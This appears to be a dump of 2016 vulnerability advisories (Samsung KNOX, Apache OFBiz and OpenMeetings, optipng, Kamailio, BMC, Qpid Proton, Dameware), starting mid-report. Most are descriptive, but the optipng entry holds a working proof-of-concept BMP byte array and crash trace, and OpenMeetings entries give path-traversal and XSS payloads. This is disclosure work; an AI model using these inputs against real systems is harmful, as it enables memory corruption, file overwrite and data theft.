[---- Code End ----]
On KNOX 2.3.0 the ``simple'' attack doesn't work due to security measures added to the clipboardEx service.
However, the attack does work when launched from a newly created activity while KNOX is running in the background.
During activity launch, for a short time, due to a race condition, the clipboardEx enters a vulnerable state during which a user application can obtain the contents of the KNOX clipboard.
After this short period (approx. 10 seconds) the service refuses to disclose the KNOX keyboard contents as it manages to identify that it is being queried outside KNOX.
The scenario in which the attack works:
1. Two malicious applications are installed, A and B.
2. Application A runs in the user environment in the background (e.g., using a service).
3. KNOX is unlocked and brought to the foreground.
4. Application A launches an activity in application B.
5. Application B's activity obtains the KNOX clipboard in its onCreate method and calls finish() to close the GUI.
Affected System Configurations
==============================
We have tested and verified the vulnerability on the following devices, however, we believe that ALL Samsung devices running KNOX 1.0.0 are vulnerable :
1. Samsung Galaxy S3
- Model Number: GT-I9305
- Android Version: 4.3
- Kernel Version: 3.0.31-2051278 dpi@DELL323 #1
- Build Number: JSS15J.I9305XXUEML8
- KNOX Version: 1.0.0
- State: Rooted, via flashing a custom recovery and kernel. KNOX warranty bit tripped, technically disabling KNOX. KNOX was re-enabled (fully functional) using root capabilities
2. Samsung Galaxy S4
- Model Number: GT-I9505
- Android Version: 4.3
- Kernel Version: 3.4.0-1869009 se.infra@SEP-106 #1
- Build Number: XXUEMJ5.CCOM
- KNOX Version: 1.0.0
- State: Rooted using SafeRoot. KNOX warranty bit not tripped, KNOX fully functional
The KNOX 2.3 vulnerability was tested and verified on the following device, however, we believe that ALL Samsung devices running KNOX 2.3 are vulnerable:
1. Samsung Note 3
- Model Number: SM-N9005
- Android Version: 5.0
- Kernel Version: 3.4.0-4540543 dpi@SWDD3013 #1
- Build Number LRX21V.N90055XXUGBOJ6
- KNOX:
- Version: 2.3
- Standard SDK: 5.3.0
- Premium SDK: 2.3.0
- Customization SDK: 2.0.0
- Container: 2.3.0
- CEP: 2.0.1
- Enterprise Billing: 1.0.0
- SE for Android: 2.3.0
- SSO: 2.1.1
- TIMA: 3.0
- VPN: 2.2.0
- State: Not rooted
Vulnerability Impact
====================
Prerequisites:
- Code execution capabilities without any permissions (normal application)
Attack:
- KNOX 1.0: Run the exploit code from any application regardless of whether KNOX is in the foreground, background or even unlocked.
- KNOX 2.3: Run attacker's code in the backround while KNOX is running in the foreground and launch an activity. Run the exploit code from the new activity.
Implications:
1. Any application without any permissions can obtain the contents of the KNOX clipboard.
2. A root/system user can simply read the persistent clipboard data from /data/clipboard/knox without having to know the user's password (due to lack of encryption).
Mitigation:
- Users of KNOX 1.x should update to the latest version of KNOX 2.x.
- Samsung are already distributing an update for KNOX 2.x patching this vulnerability.
Vendor Contact
==============
We contacted Samsung on December 9th, 2015 and have had detailed email exchanges with the vendor regarding this vulnerability.
The highlights of the vendor's responses are:
- ""Devices that are KNOX capable can be updated via the Maintenance Release process. KNOX 1.0 containers will automatically upgrade to the newer KNOX 2.x technology when the update is applied""
- ""Updating a KNOX 1.0 device to support KNOX 2.x would involve upgrading its Android version to at least Android 4.4""
- ""Following your instructions, we were able to reproduce and isolate the race condition responsible for the vulnerability you identified. We are working on a patch that eliminates the possibility of such race conditions allowing access to clipboard data, and will be deploying it to affected models as a security update""
- ""We started rolling out the remedy to the users since March of this year, and we are continuing to expand the release to more carriers.""
Vulnerability Discovery Method
==============================
We combined both static and dynamic analysis of KNOX 1.0.0 and KNOX 2.3 to find this vulnerability.
The static analysis consisted of reverse-engineering KNOX 1.0.0 / 2.3 binaries taken from the aforementioned devices (due to KNOX being closed source).
We extracted the .odex / .jar / .apk files of services and framework2 (the code of the system_server) and performed the following:
- De-odexed them using the Universal Deodexer to obtain .dex files.
- Converted the .dex files to .jar files (containing .class files) using dex2jar.
- Disassembled the .jar files using jd-gui.
- Analyzed the code of clipboardEx and client classes in framework2.
Dynamic analysis was performed via a proof-of-concept based on our understanding of the clipboardEx client and server code. To compile the code we used the framework2.jar we obtained (by using dex2jar).
Timeline
========
2015-12-09 Vendor notified
2015-12-24 Vendor requested to hold off publication to give it time to prepare a patch
2016-04-10 CVE number requested
2016-04-11 CVE number assigned
2016-04-11 Notification from vendor that patches are been distributed since march. Green light for publication.
2016-04-16 Public disclosure"
3122,CVE-2016-2170: Apache OFBiz information disclosure vulnerability,,CVE-2016-2170,"==========================================
CVE-2016-2170: Apache OFBiz information disclosure vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache OFBiz 13.07.02 and 13.07.01
Apache OFBiz 12.04.05 and earlier releases in the series (12.04.*)
The unsupported releases 11.04.*, 10.04.* and 09.04 versions are also affected but not fixed.
Description:
The infamous Java serialization vulnerability
Mitigation:
13.07.* users should upgrade to 13.07.03
12.04.05 users should upgrade to 12.04.06 (Note though that in 12.04.06 RMI is not deactivated so you should use the recommended remediation: notsoserial)
Credit:
This infamous issue was confirmed to be an issue in OFBiz by the OFBiz team, due to two external Java libraries and RMI usage.
Remediation:
Apart when using RMI with 12.04.03 version nothing is needed. But with any version, if you use JNDI, JMX or Spring and maybe other Java classes, please check the references (hint: use notsoserial with your own whitelist)
References:
https://cwiki.apache.org/confluence/display/OFBIZ/The+infamous+Java+serialize+vulnerability
=========================================="
3123,CVE-2015-3268: Apache OFBiz information disclosure vulnerability,,CVE-2015-3268,"CVE-2015-3268: Apache OFBiz information disclosure vulnerability
==========================================
Severity: Moderate
Vendor:
The Apache Software Foundation
Versions Affected:
Apache OFBiz 13.07.02 and 13.07.01
Apache OFBiz 12.04.05 and earlier releases in the series (12.04.*)
The unsupported releases 11.04.*, 10.04.* and 09.04 versions are also affected (Lilian Iatco reported he tried with r691692, which is early March 2008)
Description:
Stored Cross-Site Scripting Vulnerability affecting the description attribute of the display-entity element because it was not escaped.
Mitigation:
13.07.* users should upgrade to 13.07.03
12.04.05 users should upgrade to 12.04.06
You can find more information at https://issues.apache.org/jira/browse/OFBIZ-6506
Credit:
This issue was discovered by Lilian Iatco and reported at https://issues.apache.org/jira/browse/OFBIZ-6506
References:
http://ofbiz.apache.org/download.html#vulnerabilities
==========================================
Jacques"
3143,CVE-2016-3672 - Unlimiting the stack not longer disables ASLR,,CVE-2016-3672,"Hi everyone,
We have fixed an old and very known weakness in the Linux ASLR implementation.
The weakness allowed any user able to running 32-bit applications in a x86
machine disable the ASLR by setting the RLIMIT_STACK resource to unlimited.
This is a very old trick to disable ASLR, but unfortunately it was still present
in current Linux systems.
Details at:
http://hmarco.org/bugs/CVE-2016-3672-Unlimiting-the-stack-not-longer-disables-ASLR.html
Best,
Hector.
--
Dr. Hector Marco-Gisbert @ http://hmarco.org/
Cyber Security Researcher @ http://cybersecurity.upv.es
Universitat Politècnica de València (Spain)"
3159,CVE-2016-2191: optipng: invalid write,,CVE-2016-2191,"An invalid write may occur in optipng before version 0.7.6 while
processing bitmap images due to `crt_row' being (inc|dec)remented
without any boundary checking when encountering delta escapes.
optipng-0.7.5/src/pngxtern/pngxrbmp.c:
,----
| 210 static size_t
| 211 bmp_read_rows(png_bytepp begin_row, png_bytepp end_row, size_t row_size,
| 212 unsigned int compression, FILE *stream)
| 213 {
| ...
| 272 crt_row = begin_row;
| 273 for ( ; ; )
| 274 {
| 275 ch = getc(stream); b1 = (unsigned int)ch;
| 276 ch = getc(stream); b2 = (unsigned int)ch;
| 277 if (ch == EOF)
| 278 break;
| 279 if (b1 == 0) /* escape */
| 280 {
| ...
| 307 else if (b2 == 2) /* delta */
| 308 {
| 309 ch = getc(stream); b1 = (unsigned int)ch; /* horiz. offset */
| 310 ch = getc(stream); b2 = (unsigned int)ch; /* vert. offset */
| ...
| 314 if (b2 > (size_t)((end_row - crt_row) * inc))
| 315 b2 = (unsigned int)((end_row - crt_row) * inc);
| 316 for ( ; b2 > 0; --b2)
| 317 {
| ...
| 319 crt_row += inc;
| ...
| 322 }
| ...
| 324 }
| 325 else /* b2 >= 3 bytes in absolute mode */
| 326 {
| 327 len = (b2 <= endn - crtn) ? b2 : (unsigned int)(endn - crtn);
| 328 if (bmp_fread_fn(*crt_row, crtn, len, stream) != len)
| 329 break;
| 330 crtn += len;
| 331 }
| 332 }
| ...
| 352 }
`----
After `crt_row' has moved OOB, an invalid write may be triggered with
`bmp_fread_fn()' in absolute mode:
,----
| $ gdb --args optipng oob.bmp
| (gdb) r
| ** Processing: oob.bmp
|
| Program received signal SIGSEGV, Segmentation fault.
| __memcpy_sse2 () at ../sysdeps/x86_64/multiarch/../memcpy.S:96
| 96 ../sysdeps/x86_64/multiarch/../memcpy.S: No such file or directory.
|
| (gdb) bt
| #0 __memcpy_sse2 () at ../sysdeps/x86_64/multiarch/../memcpy.S:96
| #1 0x00007ffff7a89003 in __GI__IO_file_xsgetn (fp=0x64a010, data=<optimized out>, n=4) at fileops.c:1371
| #2 0x00007ffff7a7e5f0 in __GI__IO_fread (buf=<optimized out>, size=1, count=4, fp=0x64a010) at iofread.c:42
| #3 0x000000000040b632 in bmp_rle4_fread (ptr=0x4141 <error: Cannot access memory at address 0x4141>, offset=0, len=8, stream=0x64a010) at pngxrbmp.c:170
| #4 0x000000000040baf6 in bmp_read_rows (begin_row=0x64e668, end_row=0x64a538, row_size=4, compression=2, stream=0x64a010) at pngxrbmp.c:328
| #5 0x000000000040cb0e in pngx_read_bmp (png_ptr=0x64a240, info_ptr=0x64a4b0, stream=0x64a010) at pngxrbmp.c:724
| #6 0x000000000040b352 in pngx_read_image (png_ptr=0x64a240, info_ptr=0x64a4b0, fmt_name_ptr=0x7fffffffbf10, fmt_long_name_ptr=0x0) at pngxread.c:130
| #7 0x00000000004043cc in opng_read_file (infile=0x64a010) at optim.c:939
| #8 0x000000000040586a in opng_optimize_impl (infile_name=0x7fffffffe86f ""oob.bmp"") at optim.c:1503
| #9 0x0000000000406749 in opng_optimize (infile_name=0x7fffffffe86f ""oob.bmp"") at optim.c:1853
| #10 0x0000000000402bf0 in process_files (argc=2, argv=0x7fffffffe638) at optipng.c:941
| #11 0x0000000000402cb5 in main (argc=2, argv=0x7fffffffe638) at optipng.c:975
|
| (gdb) x/i $rip
| => 0x7ffff7aa3427 <__memcpy_sse2+55 at ../sysdeps/x86_64/multiarch/../memcpy.S:96>: mov %ecx,(%rdi)
| (gdb) p/x $ecx
| $1 = 0x11223344
| (gdb) p/x $rdi
| $2 = 0x4141
| (gdb)
`----
oob.bmp
=======
,----
| unsigned char bmp[] = {
| /* bmp header */
| 0x42, 0x4d, /* BM */
| 0x00, 0x00, 0x00, 0x00, /* bmp size */
| 0x00, 0x00, /* reserved */
| 0x00, 0x00, /* reserved */
| 0x7a, 0x00, 0x00, 0x00, /* offset */
|
| /* dib header */
| 0x6c, 0x00, 0x00, 0x00, /* header_size (BITMAPV4HEADER) */
| 0x01, 0x00, 0x00, 0x00, /* width */
| 0x26, 0x08, 0x00, 0x00, /* height */
| 0x01, 0x00, /* color planes */
| 0x04, 0x00, /* bits per pixel */
| 0x02, 0x00, 0x00, 0x00, /* compression (RLE4) */
| 0x00, 0x00, 0x00, 0x00, /* size of bitmap */
| 0x00, 0x00, 0x00, 0x00, /* horizontal resolution */
| 0x00, 0x00, 0x00, 0x00, /* vertical resolution */
| 0x01, 0x00, 0x00, 0x00, /* number of colors */
| 0x00, 0x00, 0x00, 0x00, /* number of important colors */
| 0x00, 0x00, 0x00, 0x00, /* red mask */
| 0x00, 0x00, 0x00, 0x00, /* green mask */
| 0x00, 0x00, 0x00, 0x00, /* blue mask */
| 0x00, 0x00, 0x00, 0x00, /* alpha mask */
| 0x00, 0x00, 0x00, 0x00, /* color space type */
| 0x00, 0x00, 0x00, 0x00, /* x coordinate of red endpoint */
| 0x00, 0x00, 0x00, 0x00, /* y coordinate of red endpoint */
| 0x00, 0x00, 0x00, 0x00, /* z coordinate of red endpoint */
| 0x00, 0x00, 0x00, 0x00, /* x coordinate of green endpoint */
| 0x00, 0x00, 0x00, 0x00, /* y coordinate of green endpoint */
| 0x00, 0x00, 0x00, 0x00, /* z coordinate of green endpoint */
| 0x00, 0x00, 0x00, 0x00, /* x coordinate of blue endpoint */
| 0x00, 0x00, 0x00, 0x00, /* y coordinate of blue endpoint */
| 0x00, 0x00, 0x00, 0x00, /* z coordinate of blue endpoint */
| 0x00, 0x00, 0x00, 0x00, /* red gamma */
| 0x00, 0x00, 0x00, 0x00, /* green gamma */
| 0x00, 0x00, 0x00, 0x00, /* blue gamma */
|
| /*
| * delta escape (0x00, 0x02), b1, b2
| *
| * The number of delta escapes required for crt_row to be moved
| * beyond its allocated chunk depends on the image height.
| *
| * b1 is relevant in the last escape if the value at *crt_row is a
| * non-writable address due to:
| *
| * dcrtn = (b1 < endn - crtn) ? (crtn + b1) : endn;
| * [...]
| * for ( ; b2 > 0; --b2)
| * {
| * [...]
| * crt_row += inc;
| * crtn = 0
| * [...]
| * }
| * bmp_memset_fn(*crt_row, crtn, 0, dcrtn - crtn);
| *
| * For RLE4-encoded data, bmp_rle4_memset() bails if dcrtn - crtn == 0
| */
| 0x00, 0x02, 0x11, 0xff,
| 0x00, 0x02, 0x11, 0xff,
| 0x00, 0x02, 0x11, 0xff,
| 0x00, 0x02, 0x11, 0xff,
| 0x00, 0x02, 0x11, 0xff,
| 0x00, 0x02, 0x11, 0xff,
| 0x00, 0x02, 0x11, 0xff,
| 0x00, 0x02, 0x11, 0xff,
| 0x00, 0x02, 0x00, 0xff,
|
| /*
| * absolute mode (0x00, 0x03..0xff) followed by the value that's
| * bmp_fread_fn() to *crt_row
| */
| 0x00, 0xff, 0x44, 0x33, 0x22, 0x11
| };
`----
Solution
========
This issue has been assigned CVE-2016-2191 and is fixed in optipng
0.7.6.
--
Hans Jerry Illikainen"
3189,[CVE-2016-0784] Apache OpenMeetings ZIP file path traversal,,CVE-2016-0784,"Severity: Moderate
Vendor: The Apache Software Foundation
Versions Affected: Apache OpenMeetings 1.9.x - 3.1.0
Description:
The Import/Export System Backups functionality in the OpenMeetings
Administration
menu (http://domain:5080/openmeetings/#admin/backup) is vulnerable to path
traversal via specially crafted file names within ZIP archives. By uploading an
archive containing a file named ../../../public/hello.txt will write
the file “hello.txt”
to the http://domain:5080/openmeetings/public/ directory. This could
be used to, for example,
overwrite the /usr/bin/convert file (or any other 3 rd party
integrated executable)
with a shell script, which would be executed the next time an image
file is uploaded
and imagemagick is invoked.
All users are recommended to upgrade to Apache OpenMeetings 3.1.1
Credit: This issue was identified by Andreas Lindh
Apache OpenMeetings Team
--
WBR
Maxim aka solomax"
3191,CVE-2016-2385 Kamailio SEAS module heap buffer overflow,,CVE-2016-2385,"Kamailio (successor of former OpenSER and SER) is an Open Source SIP
Server released under GPL. It can be used to build large platforms for
VoIP and realtime communications, presence, WebRTC, Instant messaging
and other applications.
A heap overflow was found in Kamailio version 4.3.4 (possibly affecting
earlier versions also). The heap overflow takes place in the encode_msg
function of the SEAS module and can be triggered remotely if the module
is enabled.
A technical analysis of the vulnerability can be found here:
https://census-labs.com/news/2016/03/30/kamailio-seas-heap-overflow/
The vulnerability may allow an attacker to cause memory corruption,
process termination or potentially remote code execution.
This defect has been fixed in version 4.3.5 of Kamailio. Administrators
of affected systems are strongly advised to upgrade Kamailio to the
latest stable release.
Disclosure Timeline
-------------------
Vendor Contact: February 12th, 2016
CVE assignment: February 15th, 2016
Vendor Patch Release: March 3rd, 2016
Public Advisory: March 30th, 2016
Regards,
Stelios Tsampas
IT Security Researcher
CENSUS S.A."
3197,BMC-2015-0011: Unauthorized password reset vulnerability in BMC Server Automation (BSA) (CVE-2016-1543),,CVE-2016-1543,"------------------------------------------------------------------------
Unauthorized password reset vulnerability in BMC Server Automation (BSA)
Unix/Linux RSCD Agent
BMC Identifier: BMC-2015-0011
CVE Identifier: CVE-2016-1543
------------------------------------------------------------------------
By BMC Application Security, MAR 2016
------------------------------------------------------------------------
Vulnerability summary
------------------------------------------------------------------------
A security vulnerability has been identified in BMC Server Automation (BSA)
RSCD Agent on the Linux/Unix platforms.
The vulnerability allows unauthorized remote password resets on a
target server by using the Remote Procedure Call (RPC) API of the
RSCD Agent. Windows agents are not affected.
------------------------------------------------------------------------
CVSS v2.0 Base Metrics
------------------------------------------------------------------------
Reference:
CVE-2016-1543
Base Vector:
CVSS v2 Vector (AV:N/AC:M/Au:N/C:C/I:P/A:C)
Base Score: 9.0
------------------------------------------------------------------------
Affected versions
------------------------------------------------------------------------
The flaw has been confirmed to exist in the following versions of BSA on
Unix and Linux platforms: 8.2.x, 8.3.x, 8.5.x, 8.6.x and 8.7.x.
------------------------------------------------------------------------
Resolution
------------------------------------------------------------------------
A hotfix as well as a workaround are available at
https://selfservice.bmc.com/casemgmt/sc_KnowledgeArticle?sfdcid=kA214000000dBpnCAE&type=Solution
------------------------------------------------------------------------
Credits
------------------------------------------------------------------------
Credit for discovery of this vulnerability:
ERNW Gmbh https://www.ernw.de
------------------------------------------------------------------------
Reference
------------------------------------------------------------------------
CVE-2016-1543
Information about BMC's corporate procedure for external vulnerability
disclosures is at http://www.bmc.com/security
-----BEGIN PGP MESSAGE-----
Version: GnuPG v2
owGtVm1sFEUYviKl9OQIQSIhIXH+tLZpb6/XL+omULZnLa1e09zC1UTaMrc72xvY
j3Nm9j40EYQoKJA0qJEfSPhh9QcxKkogRISgxGgVUQONISoxIcTWkJiKaBR05rbX
rz/+2f0zOzsz7/s+z/u87+xI6L7A0rL3Kj4+NXXnz1fLxiZTgeRfW/4J+/SAUHCL
DV2Wdgh+BukgAynNOUQHBFHEQNY1bURgCpuYFQC2QUc8BlREsogAxWWOBRl2bFDT
oSq1RVM4H3kC224eJNTYo0AZRjYLBUNBcaxb5xNsYERkYSbc2BBtCTc0RKOhYCzZ
OW+Zz8Vyazja0twUCvoFlsdRKCJQMhkTa17sKtJcwtHVg7iSAMJrKAj89JmcxyF1
LQuSgp8OFECnMSzIVxpSkELIBrjErf7/OZxNHOBfWRqBYkIjIrcgY0JmOMSiUii4
mS/N9wdN08lR4M4VFEGWw9ACXVFhGnJnDJJhLjPqRZMqAJdie7joNeEd7COOhnSX
IBDj5kFNoi9WC5S+buAYxW1zA5ZAP7Z1EQIUUz7wY7bDADQMpDGkS0KL/hEfS6oq
yDZKDaADUgTiiBGsUT89JJCBCLI1JFcWq2RuVXA1C69JjswhcqV4ZkKa/gpqlKTc
G1FicjyiuPwtJsci3XJfRJFjtTMWVM0hSAaPSA3+0qNMsw54bimXmK/MCPUZJszN
ilxzbAMTi/tjDkB5TJkQu9CI4QhhCmGVIhHq4XrnMvSaFoC27ul8VuIyaJMapXw9
H5q8ocUbWiVvf5u0TspLwF/SEog6pisq0t8WkXaYIXBSkEO8jvgIAS/IHZA4Lsci
KgVmITZhyuRvrNgD04xlqByJUGQaokSxhqSUpUmaY0U0rhxr2GIRqg09bjs5E+nD
SCEMayZqp4auYX39DqUx2txQfPSOjB1TOqtZIYPWq9MIfaYuRpCOma8q80xyARGg
Y6o5XD8Fr/NgOr/5yRxMZ6K3H3RZqTQoMZfL5SRE7JykI7+wnq/yQptpDf52tHkt
hmPqtkUxeFcETDkuE9fHw5RXG8k4BIrWPtOhBU0ozzhgaC64GkJBwZ/pUL6PAk4e
ZEWSpjkqqap0kYWCL5WtXRwoWxpYUr5I/O8EgpUrSj9BJ1MVd1dMbVW/Ot6im0+r
Q70Dz94eutyM911senOMnvzju8LWXOjmraNXus4OTn19Pdu4ZuPGRQc/r2iv61l7
ZeTDo8fO3x2bPLRz78rxF7MfVG1fuWdQHVt1+uK6ya6aN9weI37qwNi/G64tvzmg
frTzlc/2b7599bBy7/Xvj3wrjxw789iSAy+Mp6p3HaoLnKjb9EWyct+mntMVl356
ynrwyG/lg4t/Pbfhrd1/l+1qu1YdXVVf9fvBq6Nk97v7Lz//wEMn4JdDa+rHl70c
fq387HMTl/q2/0xG8wP3LtzZc33vp/LyM/03guYn2w5P1E7cqAyDX37Ex7NDbRda
3xmNnsvf3179fu/qb+Kr3/5h2ZPbbv0H
=y9nJ
-----END PGP MESSAGE-----"
3198,BMC-2015-0010: User enumeration vulnerability in BMC Server Automation (BSA) Unix/Linux RSCD Agent (CVE-2016-1542),,CVE-2016-1542,"------------------------------------------------------------------------
User enumeration vulnerability in BMC Server Automation (BSA) Unix/Linux
RSCD Agent
BMC Identifier: BMC-2015-0010
CVE Identifier: CVE-2016-1542
------------------------------------------------------------------------
By BMC Application Security, MAR 2016
------------------------------------------------------------------------
Vulnerability summary
------------------------------------------------------------------------
A security vulnerability has been identified in BMC Server Automation (BSA)
RSCD Agent on the Linux/Unix platforms.
The vulnerability allows unauthorized remote user enumeration on a
target server by using the Remote Procedure Call (RPC) API of the
RSCD Agent. Windows agents are not affected.
------------------------------------------------------------------------
CVSS v2.0 Base Metrics
------------------------------------------------------------------------
Reference:
CVE-2016-1542
Base Vector:
CVSS v2 Vector (AV:N/AC:L/Au:N/C:P/I:N/A:N)
Base Score:
5.0
------------------------------------------------------------------------
Affected versions
------------------------------------------------------------------------
The flaw has been confirmed to exist in the following versions of BSA on
Unix and Linux platforms: 8.2.x, 8.3.x, 8.5.x, 8.6.x and 8.7.x.
------------------------------------------------------------------------
Resolution
------------------------------------------------------------------------
A hotfix as well as a workaround are available at
https://selfservice.bmc.com/casemgmt/sc_KnowledgeArticle?sfdcid=kA214000000dBpnCAE&type=Solution
------------------------------------------------------------------------
Credits
------------------------------------------------------------------------
Credit for discovery of this vulnerability:
ERNW Gmbh https://www.ernw.de
------------------------------------------------------------------------
Reference
------------------------------------------------------------------------
CVE-2016-1542
Information about BMC's corporate procedure for external vulnerability
disclosures is at http://www.bmc.com/security
-----BEGIN PGP MESSAGE-----
Version: GnuPG v2
owGtVl1oHFUU3tg2P6PTSCsRJdVbK20CyexPmyYuhDi7De3WJqY7yQbsT7g7c2f3
JjNzlzt3srs+qBEVpAaF9KG1rRQq+CBt1DwE2iqlfYgkFIwPTX/EnwcfVFChFQ0i
eu9uNu3mxZe5DNy/c+855zvfOXfek9cF6ms+qfti9u6ffx2vWfglHUgtD460+9Rk
achFFCDHsxGFDBMHjHuWw8dpbGFWBNgBsb440BAd53Kqx4hdFmuJaWorGHJwIXgA
O15BlpJafA9QM8hhQJZkSRxLGHyGTYxoVFzTHgmFO9pDoXBIluKp3qptPhfbu9vD
HbsisuSfg7FiyQM1l7OwXrZdQ7pHuXdtoE9NAqFVloCfOlNVGLqebUNa9FOBCtwV
H9bEKwtdkEbIAbiCrfF/MayKHF9lWQRKIQ2K6IKcBZlJqO0qsjTIt6r1QcsieRd4
DvRYllD8MtdHkU0YAt5aZvEPcm0M0gxi3IGSOekiF8ROpqQ2WT45QImODI8iEOf3
g5bkQLwVqAMJQMyS2IMWK2AYO4awAYop7/gxhzAATRPpDBmKIKN/yMdTmgbGI0oI
xKCLQB9iFOuunxqSyEQUOTqKNpTS5MG04HQWWlPcM0KjDaKtmrSyClrUVLQ/qMaj
B4Kqx0fx6EAwIVai/a0Nq1doOqEoKksdSshfgNQV3AGPrsvD7is2goCmBfP3ea4T
x8TU5voYAaiAXSb4LlhiEsFNQa2KJYI/nPKciLzuCW5DxyhT/T7Lo6BLiSiFNt7t
LHcd5W63UpbvUjqVggL8BS2JXGJ5Ikv8rRJZwkzhpwvyiGcS7yHIEzoGKfG4LyJX
4DjEFkxbfMRKZTDLWM6NBoMuskyRpFhHStrWFZ3YQZ1Tx87YLOjqIy84JG8hI4NU
yrBuoR7XNHRsdI+pkfCuUKkZsZwTV3u3s2IOdWsrHvoMXZwiAzNfWVa+khOIAgO7
OuH8KZZrD3ar61+UO9Ob7B8Ge+10FlSQy+fzCqJOXjGQ3zQxrzSXi4O/Na2qyHCf
Eo5IhnLZhmniMfGC7HB5ttEc4eUcgdxqjRYwoQLjDkNrzesgSwI/i7hczgUcPMhK
IK1gVGFV5S2TpbdrmtcHauoDtRseEr85Aanh0cq/T9dLdf++cphcSrzJzp0Zm5xI
s6mzs0/WHazds3FdXLu2fzrW2TpyZ8utnfvu3B6b27Jj88XDZzctpvtPhqdS3jOP
oKWnPzjxeduMlavdr+ZOF6f2usd7uhonj0z92uJcurl4caG9OXRqYunhzOjM9YFF
+d559Y8Pr279/cqNT5/bMPHz819rP177qGfbhSPfzk7L67889lgx+dqFf64+fnf+
2SU6417//oeYpo/ONi6MPhG+d3rw/e7GM3NH5wNNTbcuP3Vq6Kv5heHf+t6QzXNH
xzdCuHXz3L5voHzys3cT59+aWT6UapuObO+9venvVyePHbz8ztxis/Zi04mb3x26
0bmta3no9frmn6yGwsfSfw==
=0QUC
-----END PGP MESSAGE-----"
3206,[CVE-2016-2163] Stored Cross Site Scripting in Event description,,CVE-2016-2163,"Severity: Moderate
Vendor: The Apache Software Foundation
Versions Affected: Apache OpenMeetings 1.9.x - 3.0.7
Description:
When creating an event, it is possible to create clickable URL links in
the event description. These links will be present inside the event details
once a participant enters the room via the event. It is possible to create a
link like ""javascript:alert('xss')"", which will execute once the link is
clicked. As the link is placed within an <a> tag, the actual link is not
visible to the end user which makes it hard to tell if the link is
legit or not.
All users are recommended to upgrade to Apache OpenMeetings 3.1.1
Credit: This issue was identified by Andreas Lindh
Apache OpenMeetings Team"
3207,[CVE-2016-0783] Predictable password reset token,,CVE-2016-0783,"Severity: Critical
Vendor: The Apache Software Foundation
Versions Affected: Apache OpenMeetings 1.9.x - 3.1.0
Description:
The hash generated by the external password reset function is
generated by concatenating the user name and the current system time,
and then hashing it using MD5. This is highly predictable and can be
cracked in seconds by an attacker with knowledge of the user name of
an OpenMeetings user.
All users are recommended to upgrade to Apache OpenMeetings 3.1.1
Credit: This issue was identified by Andreas Lindh
Apache OpenMeetings Team"
3225,CVE-2016-2166: Apache Qpid Proton python binding silently ignores request for 'amqps' if SSL/TLS not supported,,CVE-2016-2166,"Apache Software Foundation - Security Advisory
Apache Qpid Proton python binding silently ignores request for
'amqps' if SSL/TLS not supported.
CVE-2016-2166 CVS: 5.7
Severity: Moderate
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Qpid Proton python API starting at 0.9 up to and including
version 0.12.0.
Description:
Messaging applications using the Proton Python API to provision an
SSL/TLS encrypted TCP connection may actually instantiate a
non-encrypted connection without notice if SSL support is unavailable.
This will result in all messages being sent in the clear without the
knowledge of the user.
This issue affects those applications that use the Proton Reactor
Python API to create SSL/TLS connections. Specifically the
proton.reactor.Connector, proton.reactor.Container, and
proton.utils.BlockingConnection classes are vulnerable. These classes
can create an unencrypted connections if the ""amqps://"" URL prefix is
used.
The issue only occurs if the installed Proton libraries do not support
SSL. This would be the case if the libraries were built without SSL
support or the necessary SSL libraries are not present on the system
(e.g. OpenSSL in the case of *nix).
To check whether or not the Python API provides SSL support, use the
following console command:
python -c ""import proton; print('%s' % 'SSL present' if proton.SSL.present() else 'SSL NOT AVAILBLE')""
In addition, the issue can only occur if both ends of the connection
connect without SSL. This would be the case if the vulnerability is
active on both ends of the connection, or the non-affected endpoint
allows cleartext connections.
Solution:
Proton release 0.12.1 resolves this issue by raising an SSLUnavailable
exception when SSL is not available and a SSL/TLS connection is
requested via the ""amqps://"" URL prefix.
The 0.12.1 release can be downloaded via the website:
http://qpid.apache.org/releases/qpid-proton-0.12.1
A patch is also available:
https://issues.apache.org/jira/browse/PROTON-1157
Common Vulnerability Score information:
This issue facilitates a Man-in-the-middle attack. All communications
passing over the connection can be snooped and/or modified by a third
party.
Credit:
This issue was discovered by M. Farrellee from Red Hat.
Common Vulnerability Score information:
CVSS Base Score 5.8
Impact Subscore 4.9
Exploitability Subscore 8.6
CVSS Temporal Score 5
CVSS Environmental Score 5.7
Modified Impact Subscore 6
Overall CVSS Score 5.7"
3255,[CVE-2016-2345] Solarwinds Dameware Mini Remote Control Remote Code Execution Vulnerability,,CVE-2016-2345,"Document Title:
===============
Solarwinds Dameware Mini Remote Control Remote Code Execution Vulnerability
References (Source):
====================
http://www.kb.cert.org/vuls/id/897144
https://www.securifera.com/advisories/cve-2016-2345
http://www.dameware.com/products/mini-remote-control/product-overview.aspx
Release Date:
=============
2016-03-17
Product & Service Introduction:
===============================
Solarwinds Dameware Mini Remote Control allows for the remote administration of client systems of various operating system and architecture.
Vulnerability Information:
==============================
Class: CWE-121: Stack-based Buffer Overflow
Impact: Remote Code Execution, Denial of service
Remotely Exploitable: Yes
Locally Exploitable: Yes
CVE Name: CVE-2016-2345
Vulnerability Description:
==============================
A certain remote message parsing function inside the Dameware Mini Remote Control service does not properly validate the input size of an incoming string before passing it to wsprintfw. As a result, a specially crafted message can overflow into the bordering format field and subsequently overflow the stack frame. Exploitation of this vulnerability does not require authentication and can lead to SYSTEM level privilege on any system running the dwmrcs daemon.
Vulnerability Disclosure Timeline:
==================================
2015-12-17: Contact Solarwinds and Request Security Contact Info From Support Team
2015-12-22: Vendor Sends Link to Recent Patches, Denies Security Contact Info Request
2015-12-29: Notify Vendor Patches Are Unrelated, Offer POC, & Request Contact with Security Team Again
2016-12-31: Vendor Replies That �Details� Were Forwarded To Developers Although None Have Been Requested Or Given Yet
2016-01-08: Follow-up with Vendor; Send POC for Developers
2016-01-08: Vendor Confirms Reciept of POC & Forwards to Developers
2016-01-20: Enlist US-CERT Assistance with Vendor
2016-01-20: Vendor Asks If We Will Test A Patch; We Confirm With Vendor
2016-02-04: Follow-Up with Vendor to Receive Patch
2016-02-04: Vendors Sends Patch
2016-02-04: Notify Vendor Patch Consists of a NX Recompile. Notify Vendor of Workarounds & Urge For Actual Fix. Request Contact Info For Developers Again
2016-02-04: Vendors Forwards to Developers
2016-02-14: Update US-CERT on Progress. They Attempt to Contact Vendor Security Team Independantly
2016-03-03: Follow-up With Vendor
2016-03-03: Vendor Requests Remote Access to Our System
2016-03-04: Request Denied. We Suggest Several Trivial Potential Fixes For Vulnerability & Notify Of Impending 90 Disclosure Date
2016-03-08: Vendor Forwards to Developers
